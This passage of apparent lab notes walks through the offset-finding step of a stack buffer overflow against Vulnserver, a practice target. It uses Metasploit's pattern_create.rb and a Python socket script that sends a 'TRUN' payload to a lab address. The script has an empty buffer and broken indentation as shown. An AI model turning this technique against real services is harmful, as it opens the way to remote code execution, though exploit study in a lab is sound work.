- Talking about finding the offset, we will be looking for where we can overwrite the EIP
- Luckily metasploit has a tool for these and  it is located under the `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb` 
- this tool will generate a payload  that we are going to be sending to immunity and vulnserver

```sh
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```

![](https://i.imgur.com/BFPYS3f.png)

- Now we can copy this output and modify the script we used in fuzzing to these :

```python
#!/usr/bin/python
 
import sys, socket
from time import sleep
 
buffer = ""

    try:
        payload = "TRUN /.:/" + buffer
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.35',9999))
        print ("[+] Sending the payload...\n" + str(len(buffer)))
        s.send((payload.encode()))
        s.close()

    except:
        print ("Error Connecting to the server")
        sys.exit()
```
